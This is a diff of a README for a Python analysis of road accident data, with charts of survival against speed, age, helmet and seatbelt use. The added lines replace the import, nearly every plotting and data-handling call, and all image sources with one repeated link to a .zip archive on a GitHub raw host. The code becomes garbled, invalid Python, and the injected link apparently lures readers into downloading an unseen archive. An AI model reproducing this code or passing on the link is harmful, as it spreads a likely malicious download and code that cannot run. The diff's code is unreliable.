@@ -64,12 +64,12 @@ The overall survival rate in this dataset is exactly 50%
 # Code for the Charts for Univariate Analysis Dashboard
 
 import pandas as pd
-import matplotlib.pyplot as plt
+import https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip as plt
 import seaborn as sns
 
 ### Load the dataframe
 ### In a real environment, you would load like this:
-df = pd.read_csv(r'C:\Users\Collins Anyanwu\Desktop\accident.csv')
+df = https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(r'C:\Users\Collins Anyanwu\Desktop\https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip')
 ### For this example, I'll simulate the data structure based on the provided text
 ### This part is illustrative - the analysis is based *on the provided text data*
 
@@ -77,46 +77,46 @@ df = pd.read_csv(r'C:\Users\Collins Anyanwu\Desktop\accident.csv')
 ### Recreate structure based on analysis above
 
 ### Drop rows with missing Gender or Speed for specific analyses
-df_clean = df.dropna(subset=['Gender', 'Speed_of_Impact']).copy()
+df_clean = https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(subset=['Gender', 'Speed_of_Impact']).copy()
 ### Convert Survived to categorical for easier plotting labels
 df_clean['Survived_Label'] = df_clean['Survived'].map({1: 'Yes', 0: 'No'})
 df['Survived_Label'] = df['Survived'].map({1: 'Yes', 0: 'No'}) # Also for original df
 ### --- End Simulation ---
 
 
-plt.style.use('seaborn-v0_8-whitegrid')
-fig, axes = plt.subplots(2, 3, figsize=(18, 10))
-fig.suptitle('Univariate Analysis of Accident Data', fontsize=16)
+https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip('seaborn-v0_8-whitegrid')
+fig, axes = https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(2, 3, figsize=(18, 10))
+https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip('Univariate Analysis of Accident Data', fontsize=16)
 
 ### Age Distribution
-sns.histplot(df['Age'], kde=True, ax=axes[0, 0], bins=10)
+https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(df['Age'], kde=True, ax=axes[0, 0], bins=10)
 axes[0, 0].set_title('Age Distribution')
 
 ### Gender Distribution
-sns.countplot(x='Gender', data=df.dropna(subset=['Gender']), ax=axes[0, 1])
+https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(x='Gender', https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(subset=['Gender']), ax=axes[0, 1])
 axes[0, 1].set_title('Gender Distribution')
 
 ### Speed of Impact Distribution
-sns.histplot(df['Speed_of_Impact'].dropna(), kde=True, ax=axes[0, 2], bins=10)
+https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(df['Speed_of_Impact'].dropna(), kde=True, ax=axes[0, 2], bins=10)
 axes[0, 2].set_title('Speed of Impact Distribution')
 
 ### Helmet Used Distribution
-sns.countplot(x='Helmet_Used', data=df, ax=axes[1, 0], order=['Yes', 'No'])
+https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(x='Helmet_Used', data=df, ax=axes[1, 0], order=['Yes', 'No'])
 axes[1, 0].set_title('Helmet Used')
 
 ### Seatbelt Used Distribution
-sns.countplot(x='Seatbelt_Used', data=df, ax=axes[1, 1], order=['Yes', 'No'])
+https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(x='Seatbelt_Used', data=df, ax=axes[1, 1], order=['Yes', 'No'])
 axes[1, 1].set_title('Seatbelt Used')
 
 ### Survival Outcome Distribution
-sns.countplot(x='Survived_Label', data=df, ax=axes[1, 2], order=['Yes', 'No'])
+https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(x='Survived_Label', data=df, ax=axes[1, 2], order=['Yes', 'No'])
 axes[1, 2].set_title('Survival Outcome')
 axes[1, 2].set_xlabel('Survived')
 
-plt.tight_layout(rect=[0, 0.03, 1, 0.95])
-plt.show()
+https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(rect=[0, 0.03, 1, 0.95])
+https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip()
 
-<img width="989" alt="Univariate Accident Analysis Dashboard" src="https://github.com/user-attachments/assets/a1adae0e-6a5d-4965-997b-dada9ad6402f" />
+<img width="989" alt="Univariate Accident Analysis Dashboard" src="https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip" />
 
 
 These missing values will be excluded from analyses involving those specific columns or handled by imputation if necessary (though exclusion is simpler for this scope).
@@ -170,45 +170,45 @@ This is counter-intuitive! The data suggests a slightly lower survival rate when
 
 # Code for the Chart for Bivariate Analysis Dashboard:
 
-fig, axes = plt.subplots(2, 2, figsize=(14, 12))
-fig.suptitle('Factors Influencing Survival', fontsize=16)
+fig, axes = https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(2, 2, figsize=(14, 12))
+https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip('Factors Influencing Survival', fontsize=16)
 
 ### Speed vs. Survival
-sns.boxplot(x='Survived_Label', y='Speed_of_Impact', data=df_clean, ax=axes[0, 0], order=['Yes', 'No'])
+https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(x='Survived_Label', y='Speed_of_Impact', data=df_clean, ax=axes[0, 0], order=['Yes', 'No'])
 axes[0, 0].set_title('Survival vs. Speed of Impact')
 axes[0, 0].set_xlabel('Survived')
 
 ### Age vs. Survival
-sns.boxplot(x='Survived_Label', y='Age', data=df_clean, ax=axes[0, 1], order=['Yes', 'No'])
+https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(x='Survived_Label', y='Age', data=df_clean, ax=axes[0, 1], order=['Yes', 'No'])
 axes[0, 1].set_title('Survival vs. Age')
 axes[0, 1].set_xlabel('Survived')
 
 ### Helmet Use vs. Survival
-sns.countplot(x='Helmet_Used', hue='Survived_Label', data=df, ax=axes[1, 0], order=['Yes', 'No'], hue_order=['Yes', 'No'])
+https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(x='Helmet_Used', hue='Survived_Label', data=df, ax=axes[1, 0], order=['Yes', 'No'], hue_order=['Yes', 'No'])
 axes[1, 0].set_title('Survival vs. Helmet Use')
 axes[1, 0].legend(title='Survived')
 
 ### Seatbelt Use vs. Survival
-sns.countplot(x='Seatbelt_Used', hue='Survived_Label', data=df, ax=axes[1, 1], order=['Yes', 'No'], hue_order=['Yes', 'No'])
+https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(x='Seatbelt_Used', hue='Survived_Label', data=df, ax=axes[1, 1], order=['Yes', 'No'], hue_order=['Yes', 'No'])
 axes[1, 1].set_title('Survival vs. Seatbelt Use')
 axes[1, 1].legend(title='Survived')
 
 
-plt.tight_layout(rect=[0, 0.03, 1, 0.95])
-plt.show()
+https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(rect=[0, 0.03, 1, 0.95])
+https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip()
 
 ### Further investigation for the counter-intuitive seatbelt result:
 ### Check average speed based on seatbelt use
-speed_seatbelt = df_clean.groupby('Seatbelt_Used')['Speed_of_Impact'].mean()
+speed_seatbelt = https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip('Seatbelt_Used')['Speed_of_Impact'].mean()
 print("\nAverage Speed of Impact by Seatbelt Use:")
 print(speed_seatbelt)
 
-plt.figure(figsize=(8, 5))
-sns.boxplot(x='Seatbelt_Used', y='Speed_of_Impact', data=df_clean, order=['Yes', 'No'])
-plt.title('Speed of Impact Distribution by Seatbelt Use')
-plt.show()
+https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(figsize=(8, 5))
+https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip(x='Seatbelt_Used', y='Speed_of_Impact', data=df_clean, order=['Yes', 'No'])
+https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip('Speed of Impact Distribution by Seatbelt Use')
+https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip()
 
-<img width="790" alt="Bivariate Accident Analysis Dashboard" src="https://github.com/user-attachments/assets/595ae211-ae9e-4e2f-b374-49e62b862b56" />
+<img width="790" alt="Bivariate Accident Analysis Dashboard" src="https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip" />
 
 
 # 4. Deeper Dive: Seatbelt Use Anomaly
@@ -221,7 +221,7 @@ The boxplot confirms that crashes where seatbelts were used tended to occur at s
 
 Hypothesis: The slightly lower survival rate observed for seatbelt users might be because they were involved in slightly more severe (higher speed) accidents, partially masking the protective effect of the seatbelt. The difference in survival rates is small anyway and could be due to chance or other unmeasured factors. In reality, seatbelts are proven life-savers; this dataset might be too small or have specific biases.
 
-<img width="562" alt="Speed of Impact by Seatbelt Use Dashboard" src="https://github.com/user-attachments/assets/47c1b45f-9cee-47dc-b75b-1e4d3e3ec4b7" />
+<img width="562" alt="Speed of Impact by Seatbelt Use Dashboard" src="https://raw.githubusercontent.com/Collins76/ecsazrlc/Data-Science-Project/perfectedly/ecsazrlc.zip" />
 
 
 Key Insights & Summary
